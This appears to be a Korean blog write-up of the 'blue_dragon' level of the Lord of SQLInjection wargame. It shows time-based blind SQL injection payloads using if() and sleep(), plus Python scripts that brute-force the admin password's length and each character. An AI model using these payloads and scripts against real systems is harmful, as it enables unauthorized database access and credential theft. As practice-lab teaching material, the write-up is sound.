---
layout: single
title: "[Lord of SQLInjection] blue_dragon write-up"
date: 2025-05-05 15:50 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (blue_dragon)

### 풀이

이번 문제에서는 id와 pw 파라미터에 각각 `prob _ .` 문자에 대해서 필터링하고 있고, 쿼리를 한 번 실행한 후에 파라미터를 다시 검사해서 싱글쿼터랑 역슬래쉬가 있으면 No Hack을 출력한다. 또한 admin 계정의 pw 값을 알아내야 solve인 것이다.

![image-20250505155137390](/images/2025-05-05-los-blue_dragon/image-20250505155137390.png)

<br>

아래처럼 싱글쿼터랑 역슬래쉬 중 하나만 들어가면 쿼리는 출력되지만 result 결과가 출력되지 않고, No Hack이 출력된다.

![image-20250505160712166](/images/2025-05-05-los-blue_dragon/image-20250505160712166.png)

<br>

싱글쿼터랑 역슬래쉬를 필터링 해서 No Hack이 출력된다고 해도, sleep을 이용해서 time based sqli를 아래 쿼리를 id 파라미터에 넣어보면 가능하다는 것을 알 수 있다. if 함수에 대해서 두 번째 인자가 참일 때이고, 세 번째 인자가 거짓일 때이니가 이것만 수정해서 코드를 짜면 되겠다.

```
' or if(id='admin' and length(pw)=1, sleep(5), sleep(5))-- -
' or if(id='admin' and length(pw)=1, sleep(5), 0)-- -
```

<br>

아래처럼 파이썬 코드를 짜보면 패스워드 길이가 8인 것을 알 수 있다.

```python
import requests
import time

url = 'https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php'
cookie = {
    "PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"
}

for i in range(1, 100):
    param = {
        "id": f"' or if(id='admin' and length(pw)={i}, sleep(5), 0)-- -"
    }
    start_time = time.time()
    print(start_time)
    r = requests.get(url=url, cookies=cookie, params=param)
    end_time = time.time()
    delay = end_time - start_time
    print(f"delay: {delay}")
    if delay > 3:
        print(f"found! 패스워드 길이는 {i}입니다.")
        break
```

<img src="/images/2025-05-05-los-blue_dragon/image-20250505162122973.png" alt="image-20250505162122973" style="zoom: 50%;" />

<br>

그럼 이제 ascii(substr)을 사용해서 pw 첫 글자를 하나씩 time based sqli를 수행하는 코드를 짜주면 되겠다.

```python
import requests
import time
1
url = 'https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php'
cookie = {
    "PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"
}
password = ''

for i in range(1, 9):
    for j in range(32, 127):    
        param = {
            "id": f"' or if(id='admin' and ascii(substr(pw,{i},1))={j}, sleep(5), 0)-- -"
        }
        start_time = time.time()
        #print(start_time)
        r = requests.get(url=url, cookies=cookie, params=param)
        end_time = time.time()
        delay = end_time - start_time
        #print(f"delay: {delay}")
        if delay > 3:
            print(f"found! 패스워드 {i}번째 문자는 {chr(j)}입니다.")
            password += chr(j)
            break
print(password)
```

![image-20250505162716826](/images/2025-05-05-los-blue_dragon/image-20250505162716826.png)